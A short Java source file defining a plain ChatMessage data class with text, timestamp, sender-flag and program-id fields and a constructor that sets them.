package com.android.networking.module.chat;

import java.util.Date;

public class ChatMessage {

	public String data;
	public Date timestamp;
	public boolean from_me;
	public int programId;

	public ChatMessage(int programId, String data, Date date, boolean from_me) {
		this.data = data;
		this.timestamp = date;
		this.from_me = from_me;
		this.programId = programId;
	}

}
